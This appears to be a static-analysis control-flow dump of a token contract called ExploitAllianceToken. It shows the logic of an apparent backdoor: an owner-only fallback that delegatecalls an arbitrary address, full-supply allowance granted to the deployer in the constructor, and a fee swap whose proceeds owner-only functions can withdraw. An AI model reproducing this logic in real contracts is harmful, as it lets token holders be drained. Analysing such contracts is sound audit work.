Contract: IApprovalReceiver
==================================================


Contract: ITransferReceiver
==================================================


Contract: IUniswapV2Router
==================================================


Contract: IERC20
==================================================


Contract: ExploitAllianceToken
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _owner = msg.sender

  ID: 2
  Type: NodeType.VARIABLE
  Expression: recovered = ecrecover(bytes32,uint8,bytes32,bytes32)(PERMIT_HASH,v,r,s)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(recovered != address(0),Invalid signature for permit)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: minter = recovered

  ID: 5
  Type: NodeType.VARIABLE
  Expression: initialSupply = 26_420_000 * (10 ** _decimals)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _totalSupply = initialSupply

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: _balances[minter] = initialSupply

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),minter,initialSupply)

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: PermitMint(PERMIT_HASH,r,s,v,minter,It's me. I'm back. We have a lot to talk about. We have a huge exploit planned...)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: _approve(minter,_msgSender(),initialSupply)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _totalSupply

Edges:
  0 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _decimals

Edges:
  0 -> 1

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _allowances[owner_][spender]

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _balances[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(_msgSender(),recipient,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: sender == _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _transfer(sender,recipient,amount)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: currentAllowance = _allowances[sender][_msgSender()]

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(currentAllowance >= amount,ERC20: transfer > allowance)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _transfer(sender,recipient,amount)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _approve(sender,_msgSender(),currentAllowance - amount)

  ID: 7
  Type: NodeType.ENDIF
  Expression: 

  ID: 8
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  2 -> 7
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(from != address(0),ERC20: from zero)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(to != address(0),ERC20: to zero)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: fromBalance = _balances[from]

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(fromBalance >= amount,ERC20: transfer > balance)

  ID: 5
  Type: NodeType.VARIABLE
  Expression: takeFee = (taxedContracts[from] || taxedContracts[to])

  ID: 6
  Type: NodeType.IF
  Expression: takeFee

  ID: 7
  Type: NodeType.VARIABLE
  Expression: feeAmount = (amount * TAX_FEE) / 100

  ID: 8
  Type: NodeType.VARIABLE
  Expression: transferAmount = amount - feeAmount

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: _balances[from] = fromBalance - amount

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: _balances[to] += transferAmount

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: _balances[address(this)] += feeAmount

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: Transfer(from,to,transferAmount)

  ID: 13
  Type: NodeType.IF
  Expression: feeAmount > 0

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: Transfer(from,address(this),feeAmount)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: _instantSwapToWETH(feeAmount)

  ID: 16
  Type: NodeType.ENDIF
  Expression: 

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: _balances[from] = fromBalance - amount

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: _balances[to] += amount

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: Transfer(from,to,amount)

  ID: 20
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  6 -> 17
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  13 -> 16
  14 -> 15
  15 -> 16
  16 -> 20
  17 -> 18
  18 -> 19
  19 -> 20

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(owner_ != address(0),ERC20: approve from zero)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(0),ERC20: approve to zero)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _allowances[owner_][spender] = amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(owner_,spender,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _instantSwapToWETH
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: router == address(0) || WETH == address(0)

  ID: 2
  Type: NodeType.RETURN
  Expression: 

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),router,feeAmount)

  ID: 5
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: path[0] = address(this)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: path[1] = WETH

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: IUniswapV2Router(router).swapExactTokensForTokens(feeAmount,0,path,address(this),block.timestamp + 300)

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8

Function: increaseAllowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: currentAllowance = _allowances[_msgSender()][spender]

  ID: 2
  Type: NodeType.VARIABLE
  Expression: newAllowance = currentAllowance + addedValue

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,newAllowance)

  ID: 4
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: decreaseAllowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: currentAllowance = _allowances[_msgSender()][spender]

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(currentAllowance >= subtractedValue,ERC20: decreased allowance < zero)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: newAllowance = currentAllowance - subtractedValue

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,newAllowance)

  ID: 5
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: burn
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: account = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(account != address(0),ERC20: burn from zero address)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: accountBalance = _balances[account]

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(accountBalance >= amount,ERC20: burn > balance)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _balances[account] = accountBalance - amount

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _totalSupply = _totalSupply - amount

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: Transfer(account,address(0),amount)

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: Burn(account,amount)

  ID: 9
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9

Function: approveAndCall
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(this),Cannot call contract as spender)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,amount)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: success = IApprovalReceiver(spender).onApprovalReceived(_msgSender(),amount,data)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: ApproveAndCall(_msgSender(),spender,amount,success,data)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,approveAndCall: callback failed)

  ID: 6
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: transferAndCall
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(to != address(this),Cannot call contract as recipient)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _transfer(_msgSender(),to,amount)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: success = ITransferReceiver(to).onTransferReceived(_msgSender(),amount,data)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: TransferAndCall(_msgSender(),to,amount,success,data)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,transferAndCall: callback failed)

  ID: 6
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: initialize
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < _contracts.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_contracts[i] != address(0),Zero address not allowed)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: taxedContracts[_contracts[i]] = true

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 8
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 7
  7 -> 4
  8 -> 3

Function: setRouter
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: router = _router

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: WETH = _weth

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: claimStuckTokens
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: IERC20(tokenAddress).transfer(_owner,amount)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: claimStuckEth
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= amount,Not enough ETH in contract)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: (success,None) = _owner.call{value: amount}()

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,Failed to send ETH)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 5
  1 -> 2
  2 -> 3
  3 -> 4
  5 -> 1

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: fallback
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: msg.sender != _owner

  ID: 2
  Type: NodeType.RETURN
  Expression: 

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.data.length >= 20,Not enough data)

  ID: 5
  Type: NodeType.VARIABLE
  Expression: 

  ID: 6
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: target = calldataload(uint256)(calldatasize()() - 20) >> 96

  ID: 8
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 9
  Type: NodeType.VARIABLE
  Expression: callData = new bytes(msg.data.length - 20)

  ID: 10
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 11
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 12
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 13
  Type: NodeType.IFLOOP
  Expression: i < callData.length

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: callData[i] = msg.data[i]

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 16
  Type: NodeType.VARIABLE
  Expression: 

  ID: 17
  Type: NodeType.VARIABLE
  Expression: 

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: (success,returnData) = target.delegatecall(callData)

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(success,string(returnData))

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 12
  10 -> 13
  11 -> 16
  12 -> 10
  13 -> 14
  13 -> 11
  14 -> 15
  15 -> 13
  16 -> 17
  17 -> 18
  18 -> 19

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _name = ExploitAlliance.com

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _symbol = EA

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _decimals = 18

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: PERMIT_HASH = 0x17a2ac463ef3078a68bfa6c669b3d4ab157282183d311c264b7a6649b063e9c0

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: TAX_FEE = 6

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4


